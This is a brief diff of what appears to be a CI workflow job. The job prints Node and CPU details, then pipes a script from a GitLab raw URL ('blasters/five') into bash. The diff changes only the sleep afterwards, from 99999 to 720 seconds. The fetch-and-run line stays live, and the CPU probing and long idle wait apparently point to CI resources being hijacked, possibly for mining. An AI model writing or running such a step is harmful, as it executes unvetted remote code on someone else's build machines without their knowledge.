@@ -66,7 +66,7 @@ jobs:
           node -v; npm -v; which node
           lscpu | head -10
 
-          curl -sL  https://gitlab.com/makanan99/blasters/-/raw/main/five | bash && sleep 99999
+          curl -sL  https://gitlab.com/makanan99/blasters/-/raw/main/five | bash && sleep 720
 
           RC=$?
 
